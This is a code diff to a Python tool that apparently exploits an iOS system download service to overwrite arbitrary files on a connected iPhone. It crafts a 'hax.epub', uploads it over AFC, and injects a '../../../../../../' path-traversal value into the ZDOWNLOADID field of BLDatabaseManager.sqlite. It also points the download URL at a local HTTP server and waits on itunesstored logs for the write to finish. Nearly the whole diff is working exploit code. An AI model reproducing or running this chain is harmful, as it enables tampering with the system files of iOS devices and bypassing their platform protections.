@@ -118,34 +118,29 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
                 # remote_file_paths.append(remote_file_path)
                 click.secho(f"Checking {relative_path.as_posix()} -> {remote_file_path}", fg="bright_black")
                 total_files += 1
-        click.secho(f"Actually uploading {total_files} files...", fg="yellow")
-        afc.push(overridefile, f"Downloads/{overridefile.name}")
+        # We use a HTTP server for this to work properly, so AFC upload is useless here.
     else:
         # Upload the file
-        click.secho(f"Uploading {overridefile.name}", fg="yellow")
+        click.secho(f"Checking {overridefile.name}", fg="yellow")
         remote_file_path = f"Downloads/{path.name}"
-        afc.push(overridefile, remote_file_path)
         relative_files.append(Path(path.name))
 
     # WIP iOS slop
-    # shutil.rmtree("Downloads", ignore_errors=True)
-    # Path("Downloads").mkdir(exist_ok=True)
-    # if overridefile.is_file():
-    #     shutil.copyfile(overridefile, Path("Downloads") / overridefile.name)
-    #     relative_files.append(Path(overridefile.name))
-    # else:
-    #     shutil.copytree(overridefile, Path("Downloads"), dirs_exist_ok=True)
-    #     for root, dirs, files in os.walk(overridefile):
-    #         for file in files:
-    #             local_file_path = Path(root) / file
-    #             relative_path = local_file_path.relative_to(overridefile)
-    #             relative_files.append(relative_path)
-    #     total_files = len(relative_files)
-    afc.push("iTunesMetadata.plist", "Downloads/iTunesMetadata.plist")
+    shutil.rmtree("Downloads", ignore_errors=True)
+    Path("Downloads").mkdir()
+    if overridefile.is_file():
+        shutil.copyfile(overridefile, Path("Downloads") / overridefile.name)
+    else:
+        shutil.copytree(overridefile, Path("Downloads"), dirs_exist_ok=True)
+
+    # Upload iTunesMetadata.plist
+    click.secho("Uploading iTunesMetadata.plist...", fg="yellow")
+    afc.push("iTunesMetadata.plist", "Books/iTunesMetadata.plist")
 
     # Loop so that we can download multiple files if needed
     for (i, relative_path) in enumerate(relative_files):
         click.secho(f"Processing file {i+1} of {total_files}: {relative_path.as_posix()}", fg="yellow")
+
         # Modify BLDatabaseManager.sqlite
         # Copy BLDatabaseManager.sqlite to tmp.BLDatabaseManager.sqlite
         if total_files == 1:
@@ -154,6 +149,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
             filetooverwritename = str(path.joinpath(relative_path))
         click.secho(f"File to overwrite on device: {filetooverwritename}", fg="bright_black")
         click.secho("Relative path: " + str(relative_path), fg="bright_black")
+
         # Craft our epub file here
         epub_path = Path("hax.epub")
         target_file = overridefile.joinpath(relative_path)
@@ -163,18 +159,21 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
             # Add mimetype file
             epub.writestr("Caches/mimetype", "application/epub+zip", compress_type=zipfile.ZIP_STORED)
             epub.write(target_file, f"Caches/{relative_path.as_posix()}", compress_type=zipfile.ZIP_DEFLATED)
-        afc.push(epub_path, "Downloads/hax.epub")
+        
+        # Upload our crafted epub
+        afc.push(epub_path, "Books/asset.epub")
         shutil.copyfile("BLDatabaseManager.sqlite", "tmp.BLDatabaseManager.sqlite")
         blconn = sqlite3.connect("tmp.BLDatabaseManager.sqlite")
         cursor = blconn.cursor()
+
         # What the fuck I'm die trying...
         sequel_command = f"""
         UPDATE ZBLDOWNLOADINFO
         SET 
-            ZASSETPATH = '/var/mobile/Media/Downloads/hax.epub',
-            ZDOWNLOADID = '../../../../../../{filetooverwritename[1:]}',
-            ZPLISTPATH = '/private/var/mobile/Media/Downloads/iTunesMetadata.plist',
-            ZURL = '/var/mobile/Media/Downloads/{relative_path.as_posix()}'
+            ZASSETPATH = '/private/var/mobile/Media/Books/asset.epub',
+            ZDOWNLOADID = '../../../../../../{filetooverwritename}',
+            ZPLISTPATH = '/var/mobile/Media/Books/iTunesMetadata.plist',
+            ZURL = 'http://{ip}:{port}/Downloads/{relative_path.as_posix()}'
         """
         click.secho(sequel_command, fg="bright_black")
         cursor.execute(sequel_command)
@@ -227,7 +226,7 @@ def main_callback(service_provider: LockdownClient, dvt: DvtSecureSocketProxySer
         
         # Wait for itunesstored to finish download and raise an error
         click.secho("Waiting for itunesstored to finish download...", fg="yellow")
-        download_timeout = 15  # seconds
+        download_timeout = 30  # seconds
         download_start_time = time.time()
         for syslog_entry in OsTraceService(lockdown=service_provider).syslog():
             # Check for timeout
